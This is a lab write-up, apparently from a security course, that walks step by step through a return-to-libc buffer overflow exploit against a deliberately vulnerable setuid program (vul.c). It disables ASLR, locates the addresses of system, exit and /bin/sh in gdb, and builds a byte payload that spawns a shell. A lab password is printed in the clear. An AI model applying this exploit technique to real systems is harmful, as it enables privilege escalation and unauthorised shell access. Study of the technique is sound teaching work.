# Return-To-LibC-Attack
The Return-To-Libc attack, commonly known as RTL is an attack that is profoundly known for exploiting weaknesses of a Buffer Overflow condition on a system with a non-executable stack. In this type of attack, the attack uses a tactic similar to the typical buffer overflow attack, where the return address is used to redirect the program to a different source [1]. 
But unlike a normal Buffer Overflow attack, RTL uses function provided by inbuilt library i.e. the system() call. The attacker can then overwrite the return address space and assign address of the shell code i.e. ‘/bin/sh’ address in our case. This will allow the attacker to gain access to the command shell and allow him/her to extract information from the system [3].

Now, steps used to perform the attack:

1. Turn off address randomization</br>
**Command:**
-	$ sudo sysctl -w kernel.randomize_va_space=0
enter password: dees
 kernel.randomize_va_space = 0

2. Set Environment Variables for /bin/sh address</br>
**Command:**
$ export MYSHELL="/bin/sh"

3. Executing the vul.c file to understand the registers and their current addresses</br> 
**Command:**
-	$  gcc -g -fno-stack-protector -m32 vul.c -o vul
-	$ chmod 4755 vul
-	$ gdb ./vul

<img src="/Images/1.png" width=500 height=500>

 
4. Overflowing the Buffer with all ‘A’ to check ending limit of Return Address(EIP)</br>
**Command:** 
-	$ (python -c 'print "A"*27')> badfile
-	$ gcc -g -fno-stack-protector -m32 vul.c -o vul
-	$ gdb ./vul
 
5. Extract 'system' & 'exit' addresses by compiling and running the vul.c file once</br>
**Command:**
-	(gdb) r
-	(gdb) p system
 $1 = {<text variable, no debug info>} 0xb7e5f430 <system>
-	(gdb) p exit
 $2 = {<text variable, no debug info>} 0xb7e52fb0 <exit>

6. Extract the address for '/bin/sh' using exp.c file</br> 
**Command:**
- $ gcc -g -fno-stack-protector -m32 exp.c -o exp 
- $ gdb ./exp
- (gdb) r

--> Starting program: /home/seed/exp  
    bffffe8f  
    [Inferior 1 (process 4738) exited normally] 

 

7. Now perform the attack by using a python script and concatenation addresses for 'system', 'exit'& '/bin/sh'</br>
**Command:**
-	$ (python -c'print "A"*23 +"\x30\xf4\xe5\xb7"+"\xb0\x2f\xe5\xb7"+"\x8f\xfe\xff\xbf"')>badfile
-	$ gcc -g -fno-stack-protector -m32 vul.c -o vul
-	$ gdb ./vul
-	(gdb) r

--> Starting program: /home/seed/vul 
Read from file: AAAAAAAAAAAAAAAAAAAAAAA0�巰/巏���  
$

8. Now, in order to execute the attack even when the kernel is generating random addresses, use following commands along with commands from steps 1-7</br>
**Commands:**
-	$ sudo sysctl -w kernel.randomize_va_space=2
enter password: dees
--> kernel.randomize_va_space = 2
-	$ gcc -g -fno-stack-protector -m32 vul.c -o vul
-	$ gdb ./vul
-	(gdb) set disable-randomization off
-	(gdb) r

Here, we use set disable-randomization off command to bypass the kernel address randomization inside the gdb debugger.

